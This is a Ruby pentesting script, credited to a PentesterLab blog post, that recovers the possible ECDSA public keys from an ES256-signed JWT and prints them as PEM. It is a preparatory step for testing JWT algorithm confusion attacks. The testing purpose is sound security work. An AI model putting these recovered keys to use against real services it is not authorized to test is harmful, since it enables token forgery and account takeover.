require 'ecdsa'
require 'digest/sha2'
require 'openssl'
require 'base64'

=begin
Script to generate derivated ECDSA public keys from a JWT ECDSA signed token.
The goal is to test exposure to algorithm confusion attacks on token using ECDSA key pair.

Dependencies:
        gem install ecdsa

Source of the script (author):
        https://blog.pentesterlab.com/exploring-algorithm-confusion-attacks-on-jwt-exploiting-ecdsa-23f7ff83390f

Fixed for OpenSSL 3.0+ (immutable PKey objects)
=end

# We take the token from the command line
token = ARGV[0]

# We use Secp256r1
group = ECDSA::Group::Secp256r1

# We split the token to get the data to digest and the signature
parts = token.split('.')
data = parts[0] + "." + parts[1]
signature_b64 = parts[2]

# We compute the digest
digest = Digest::SHA2.digest(data)

# We create an ECDSA::Signature from the JWT signature
signature_bytes = Base64.urlsafe_decode64(signature_b64)
r = ECDSA::Format::IntegerOctetString.decode signature_bytes[0..31]
s = ECDSA::Format::IntegerOctetString.decode signature_bytes[32..-1]
signature = ECDSA::Signature.new(r, s)

# We recover all the potential keys in an array
keys = ECDSA.recover_public_key(group, digest, signature).to_a

# Finally, we use OpenSSL to get the keys in PEM format.
# NOTE: OpenSSL 3.0+ made PKey objects immutable, so we build a
# SubjectPublicKeyInfo (SPKI) DER structure and load it directly
# instead of using the deprecated `public_key=` setter.
keys.each_with_index do |point, index|
  # Encode the recovered point as an uncompressed octet string
  point_octet = ECDSA::Format::PointOctetString.encode(point, compression: false)

  # Build a SubjectPublicKeyInfo (SPKI) DER structure:
  #   SEQUENCE {
  #     SEQUENCE { OID id-ecPublicKey, OID prime256v1 }
  #     BIT STRING <uncompressed point>
  #   }
  spki = OpenSSL::ASN1::Sequence([
    OpenSSL::ASN1::Sequence([
      OpenSSL::ASN1::ObjectId("id-ecPublicKey"),
      OpenSSL::ASN1::ObjectId("prime256v1")
    ]),
    OpenSSL::ASN1::BitString(point_octet)
  ])

  # Read the DER back as an immutable public key (OpenSSL 3.0 compatible)
  ec_key = OpenSSL::PKey::EC.new(spki.to_der)

  puts "[+] Key #{index + 1}:"
  puts ec_key.to_pem
end